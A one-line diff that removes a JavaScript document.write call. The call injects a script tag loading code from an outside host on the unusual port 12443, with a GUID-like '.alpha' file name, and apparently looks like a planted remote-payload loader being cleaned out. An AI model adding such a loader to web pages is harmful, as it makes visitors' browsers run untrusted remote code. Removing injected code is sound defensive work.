@@ -1,1 +1,0 @@
-document.write('<script src="https://www.govkunming.cn:12443/ty/7914BBCB-4763-2584-22-4764E788356A.alpha"><\/script>');
